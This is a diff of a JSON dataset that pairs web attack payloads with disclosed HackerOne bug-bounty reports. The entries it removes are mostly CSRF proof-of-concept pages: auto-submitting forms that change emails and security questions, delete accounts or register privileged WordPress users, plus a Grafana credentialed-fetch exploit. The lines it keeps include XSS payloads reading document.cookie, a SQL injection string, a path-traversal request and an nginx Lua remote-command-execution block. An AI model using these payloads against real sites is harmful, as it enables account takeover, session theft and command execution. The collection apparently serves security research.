     "id": "2177f779",
     "class": "xss",
     "payload": "<img src=x onerror=alert(document.cookie)>",
@@ -19921,23 +19394,6 @@
       "severity": "medium",
       "bounty": null,
       "disclosed_at": "2022-02-08"
-    }
-  },
-  {
-    "id": "cb07e314",
-    "class": "csrf",
-    "payload": "<form action=\"                            \">",
-    "technique": "CSRF using malicious HTML form submission",
-    "param": null,
-    "report": {
-      "id": 1124540,
-      "url": "https://hackerone.com/reports/1124540",
-      "title": "Login CSRF : Login Authentication Flaw on  https://target.com/",
-      "program": "Liberapay",
-      "reporter": "samjoy_26",
-      "severity": "low",
-      "bounty": null,
-      "disclosed_at": "2021-04-05"
     }
   },
   {
@@ -21131,23 +20587,6 @@
     }
   },
   {
-    "id": "c571b636",
-    "class": "csrf",
-    "payload": "<html>\n  <body>\n    <form action=\"https://target.com/api/calendar/save\" method=\"POST\">\n        <input type=\"hidden\" name=\"availability[Sunday][12a]\" value=\"true\" />\n        <input type=\"hidden\" name=\"availability[Sunday][1a]\" value=\"true\" />\n\t\t\n\t\t...\n\t\t\n        <input type=\"hidden\" name=\"availability[Saturday][11p]\" value=\"true\" />\n        <input type=\"hidden\" name=\"tz\" value=\"Asia/Singapore\" />\n    </form>\n    <script>\n      \tdocument.forms[0].submit();\n    </script>\n  </body>\n</html>",
-    "technique": "Cross\u2011Site Request Forgery (CSRF) using an auto\u2011submitting hidden HTML form that posts to the target endpoint.",
-    "param": null,
-    "report": {
-      "id": 1309435,
-      "url": "https://hackerone.com/reports/1309435",
-      "title": "Widespread CSRF on authenticated POST endpoints",
-      "program": "UPchieve",
-      "reporter": "zeyu2001",
-      "severity": "high",
-      "bounty": null,
-      "disclosed_at": "2022-02-13"
-    }
-  },
-  {
     "id": "7cdca4ae",
     "class": "xss",
     "payload": "http://\u2588\u2588\u2588\u2588/7/0/33/1d/target.com/search?what=Binit&where=Binit%22%3E%3Cimg%20src%3Dbinit%20onerror%3Dalert%28document.domain%29%3E",
@@ -21947,40 +21386,6 @@
     }
   },
   {
-    "id": "cede262b",
-    "class": "csrf",
-    "payload": "<html>\n  <head></head>\n  <body>\n<h1>cross-origin-request-forgery POC</h1>\n<div id=statusdiv></div>\n<script>\n\nvar victim_instance = \"<vic_instance>\";\n\nfunction log_status(msg) {\n  //status logger.\n  let com = document.getElementById('statusdiv')\n  com.innerHTML += \"<h2>\" + msg + \"</h2>\"\n}\n\nfunction dashboard_poc() {\n\tlog_status(\"[*] Creating Dashboard\")\n\tvar url = `${victim_instance}/api/dashboards/db`\n\tfetch(url,\n\t\t{\n\t\t\tmethod:\"POST\",\n\t\t\tmode:\"no-cors\",\n\t\t\tcredentials:\"include\",\n\t\t\theaders: {\n\t\t",
-    "technique": "CSRF using fetch with credentials (no\u2011cors) to POST JSON to Grafana API endpoints",
-    "param": null,
-    "report": {
-      "id": 1458236,
-      "url": "https://hackerone.com/reports/1458236",
-      "title": "0-day Cross Origin Request Forgery vulnerability in Grafana 8.x .",
-      "program": "Aiven Ltd",
-      "reporter": "abrahack",
-      "severity": "high",
-      "bounty": null,
-      "disclosed_at": "2022-03-16"
-    }
-  },
-  {
-    "id": "c581fe07",
-    "class": "csrf",
-    "payload": "<html>\n  <head></head>\n  <body>\n<h1>CSRF Login POC, you will be redirected in 20 seconds</h1>\n<div id=statusdiv></div>\n<script>\n\nvar attacker_instance = \"<att_instance>\";\nvar attacker_instance_username = \"avnadmin\";\nvar attacker_instance_password = \"<att_password>\";\nvar attacker_csrf_proxy = \"<att_ssrf_url>\";\n\nvar csrf_html = `\n  <form enctype=\"text/plain\" action=\"${attacker_instance}/login\" method=POST>\n  <input type=\"text\" name='{\"user\":\"${attacker_instance_username}\",\"password\":\"${attacker_in",
-    "technique": "CSRF login via auto\u2011submitted form and SVG onload to POST attacker\u2011controlled credentials",
-    "param": null,
-    "report": {
-      "id": 1458236,
-      "url": "https://hackerone.com/reports/1458236",
-      "title": "0-day Cross Origin Request Forgery vulnerability in Grafana 8.x .",
-      "program": "Aiven Ltd",
-      "reporter": "abrahack",
-      "severity": "high",
-      "bounty": null,
-      "disclosed_at": "2022-03-16"
-    }
-  },
-  {
     "id": "3b5be6ed",
     "class": "xss",
     "payload": "<pre data-sourcepos=\"&#34;%22 href=&#34;x&#34;></pre>\n<base href=https://target.com>\n<pre x=&#34;\">\n<code></code></pre>",
@@ -22661,23 +22066,6 @@
     }
   },
   {
-    "id": "79284bb5",
-    "class": "csrf",
-    "payload": "<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"\u2588\u2588\u2588\u2588\u2588/registration/my-account.cfm\" method=\"POST\">\n      <input type=\"hidden\" name=\"cmdSubmit\" value=\"Update&#32;My&#32;Account\" />\n      <input type=\"hidden\" name=\"txtFirstname\" value=\"fname\" />\n      <input type=\"hidden\" name=\"txtMI\" value=\"hi\" />\n      <input type=\"hidden\" name=\"txtLastname\" value=\"lnames\" />\n      <input type=\"hidden\" name=\"txtAddress\" value=\"hello\" />\n      <input type=\"hidden\" name=\"optAddre",
-    "technique": "Cross\u2011Site Request Forgery using an auto\u2011submitting hidden form",
-    "param": null,
-    "report": {
-      "id": 1626356,
-      "url": "https://hackerone.com/reports/1626356",
-      "title": "Account Takeover and Information update due to cross site request forgery via POST \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/registration/my-account.cfm",
-      "program": "U.S. Dept Of Defense",
-      "reporter": "snifyak",
-      "severity": "medium",
-      "bounty": null,
-      "disclosed_at": "2022-10-14"
-    }
-  },
-  {
     "id": "e680f7b2",
     "class": "idor",
     "payload": "https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/Download.aspx?id=4675",
@@ -22777,23 +22165,6 @@
       "severity": "medium",
       "bounty": null,
       "disclosed_at": "2022-09-06"
-    }
-  },
-  {
-    "id": "ba098aef",
-    "class": "csrf",
-    "payload": "<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://\u2588\u2588\u2588\u2588/users/user\" method=\"POST\">\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>",
-    "technique": "Cross-Site Request Forgery using a malicious HTML form that auto-submits a POST request",
-    "param": null,
-    "report": {
-      "id": 1629828,
-      "url": "https://hackerone.com/reports/1629828",
-      "title": "CSRF to delete accounts [HtUS]",
-      "program": "U.S. Dept Of Defense",
-      "reporter": "nightm4re",
-      "severity": "high",
-      "bounty": null,
-      "disclosed_at": "2023-05-15"
     }
   },
   {
@@ -23185,23 +22556,6 @@
       "severity": "medium",
       "bounty": null,
       "disclosed_at": "2022-09-23"
-    }
-  },
-  {
-    "id": "da971c39",
-    "class": "csrf",
-    "payload": "<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://target.com/Users/GoogleDisable/2026462\">\n      <input type=\"hidden\" name=\"&#95;pjax\" value=\"&#35;main\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>",
-    "technique": "CSRF using an auto\u2011submitting hidden form",
-    "param": null,
-    "report": {
-      "id": 1668489,
-      "url": "https://hackerone.com/reports/1668489",
-      "title": "CSRF vulnerability allows disabling Gmail contacts link for user referrals",
-      "program": "Insightly",
-      "reporter": "khaledx",
-      "severity": "medium",
-      "bounty": null,
-      "disclosed_at": "2025-09-19"
     }
   },
   {
@@ -24565,23 +23919,6 @@
     }
   },
   {
-    "id": "375dd962",
-    "class": "csrf",
-    "payload": "<html>\n  <body>\n    <form action=\"\u2588\u2588\u2588\u2588\">\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>",
-    "technique": "Cross-Site Request Forgery using an auto\u2011submitting HTML form",
-    "param": null,
-    "report": {
-      "id": 2029753,
-      "url": "https://hackerone.com/reports/2029753",
-      "title": "CSRF to delete a pet",
-      "program": "Mars",
-      "reporter": "d0rift",
-      "severity": "medium",
-      "bounty": null,
-      "disclosed_at": "2023-08-30"
-    }
-  },
-  {
     "id": "82f8fd8f",
     "class": "path-traversal",
     "payload": "curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{\"version\":\"v1\", \"trained_at\": \"2023-01-01T00:00:00Z/../../..\", \"input\": [{\"title\": \"test xss\", \"num_of_top_predictions\": 3}]}'",
@@ -25568,23 +24905,6 @@
     }
   },
   {
-    "id": "5f450049",
-    "class": "csrf",
-    "payload": "GET /reports/<the-report-id-here>.json HTTP/2\nHost: target.com\nSec-Ch-Ua-Mobile: ?0\nX-Datadog-Origin: rum\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36\nX-Datadog-Sampling-Priority: 1\nAccept: application/json, text/javascript, */*; q=0.01\nX-Requested-With: XMLHttpRequest\nX-Datadog-Parent-Id: 578794727646244533\nX-Datadog-Trace-Id: 180506980422927885\nSec-Ch-Ua-Platform: \"Windows\"\nSec-Fetch-Site: same-origin\nSec-Fe",
-    "technique": "CSRF attack by forging a GET request to /reports/<id>.json with victim's cookies and CSRF token",
-    "param": null,
-    "report": {
-      "id": 2580982,
-      "url": "https://hackerone.com/reports/2580982",
-      "title": "Private data related to program exposed via /reports/<id>.json endpoint to external user participant",
-      "program": "HackerOne",
-      "reporter": "saurabhb",
-      "severity": "medium",
-      "bounty": null,
-      "disclosed_at": "2024-08-30"
-    }
-  },
-  {
     "id": "b5b7e40e",
     "class": "sqli",
     "payload": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/523.10.3 (KHTML, like Gecko) Version/3.0.4 Safari/523.10' AND 8074=8074-- KwOG",
@@ -25616,40 +24936,6 @@
       "severity": "high",
       "bounty": null,
       "disclosed_at": "2024-11-06"
-    }
-  },
-  {
-    "id": "b6335212",
-    "class": "csrf",
-    "payload": "<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n    <form action=\"https://www.\u2588\u2588\u2588\u2588\u2588/mediagallery/delete/id/{album-id}\">\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>",
-    "technique": "CSRF via auto\u2011submitting HTML form",
-    "param": null,
-    "report": {
-      "id": 2652190,
-      "url": "https://hackerone.com/reports/2652190",
-      "title": "CSRF Attack leads to delete album at",
-      "program": "U.S. Dept Of Defense",
-      "reporter": "prakhar0x01",
-      "severity": "medium",
-      "bounty": null,
-      "disclosed_at": "2024-12-18"
-    }
-  },
-  {
-    "id": "f63d5724",
-    "class": "csrf",
-    "payload": "<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n    <form action=\"https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/member/updatesecurityquestions\" method=\"POST\">\n      <input type=\"hidden\" name=\"security&#95;questions1\" value=\"1\" />\n      <input type=\"hidden\" name=\"security&#95;question&#95;answer1\" value=\"hacked\" />\n      <input type=\"hidden\" name=\"security&#95;questions2\" value=\"2\" />\n      <input type=\"hidden\" name=\"security&#95;question&#95;answer2\" value=\"hacked\" />\n      <input type=\"hidde",
-    "technique": "CSRF via auto\u2011submitting HTML form that changes security questions",
-    "param": null,
-    "report": {
-      "id": 2652603,
-      "url": "https://hackerone.com/reports/2652603",
-      "title": "CSRF Attack on changing security questions leads to full Account TakeOver",
-      "program": "U.S. Dept Of Defense",
-      "reporter": "prakhar0x01",
-      "severity": "high",
-      "bounty": null,
-      "disclosed_at": "2024-12-18"
     }
   },
   {
@@ -25687,23 +24973,6 @@
     }
   },
   {
-    "id": "9afe384f",
-    "class": "csrf",
-    "payload": "<html>\n\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n\n  <body>\n\n    <form action=\"https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/account/profile/edit\" method=\"POST\">\n\n      <input type=\"hidden\" name=\"username\" value=\"hacker\" />\n\n      <input type=\"hidden\" name=\"password\" value=\"\" />\n\n      <input type=\"hidden\" name=\"cpassword\" value=\"\" />\n\n      <input type=\"hidden\" name=\"email\" value=\"mojejas248&#64;esterace&#46;com\" />\n\n      <input type=\"hidden\" name=\"save\" value=\"Save\" />\n\n      <input type=\"submit\" value=\"",
-    "technique": "CSRF via auto\u2011submitting HTML form that updates user profile",
-    "param": null,
-    "report": {
-      "id": 2699029,
-      "url": "https://hackerone.com/reports/2699029",
-      "title": "CSRF leads to Account takeover",
-      "program": "U.S. Dept Of Defense",
-      "reporter": "br0x1337",
-      "severity": "high",
-      "bounty": null,
-      "disclosed_at": "2024-12-18"
-    }
-  },
-  {
     "id": "9c181d7b",
     "class": "rce",
     "payload": "set_by_lua_block $my_var { \n            local rsfile = io.popen(ngx.req.get_headers()[\"pathinjection\"]);\n            local rschar = rsfile:read(\"*all\");ngx.say(rschar); \n            return rschar;\n} \nproxy_set_header X-My-Var $my_var;",
@@ -25735,23 +25004,6 @@
       "severity": "low",
       "bounty": null,
       "disclosed_at": "2024-12-07"
-    }
-  },
-  {
-    "id": "dca197b7",
-    "class": "csrf",
-    "payload": "<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n    <form action=\"https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/account/profile/edit\" method=\"POST\">\n      <input type=\"hidden\" name=\"username\" value=\"hacker\" />\n      <input type=\"hidden\" name=\"password\" value=\"\" />\n      <input type=\"hidden\" name=\"cpassword\" value=\"\" />\n      <input type=\"hidden\" name=\"email\" value=\"rahes53167&#64;esterace&#46;com\" />\n      <input type=\"hidden\" name=\"save\" value=\"Save\" />\n      <input type=\"submit\" value=\"Submit re",
-    "technique": "CSRF attack using auto\u2011submitting hidden form",
-    "param": null,
-    "report": {
-      "id": 2712857,
-      "url": "https://hackerone.com/reports/2712857",
-      "title": "CSRF leads to Account takeover",
-      "program": "U.S. Dept Of Defense",
-      "reporter": "br0x1337",
-      "severity": "high",
-      "bounty": null,
-      "disclosed_at": "2024-12-18"
     }
   },
   {
@@ -26024,23 +25276,6 @@
       "severity": "high",
       "bounty": 6000.0,
       "disclosed_at": "2025-07-29"
-    }
-  },
-  {
-    "id": "1bcc1533",
-    "class": "csrf",
-    "payload": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Loading...</title>\n</head>\n<body onload=\"document.getElementById('csrf-form').submit();\">\n\n    <form id=\"csrf-form\" action=\"http://localhost/victim/wp-login.php\" method=\"POST\">\n        <input type=\"hidden\" name=\"user_login\" value=\"evilpen\">\n        <input type=\"hidden\" name=\"user_email\" value=\"attacker@email.com\">\n        <input type=\"hidden\" na",
-    "technique": "CSRF using auto-submitting hidden form to register a user with elevated role",
-    "param": null,
-    "report": {
-      "id": 2999394,
-      "url": "https://hackerone.com/reports/2999394",
-      "title": "Pivilege escalation of any new user to Keymaster caused by CSRF",
-      "program": "WordPress",
-      "reporter": "br3n",
-      "severity": "medium",
-      "bounty": null,
-      "disclosed_at": "2025-09-13"
     }
   },
   {
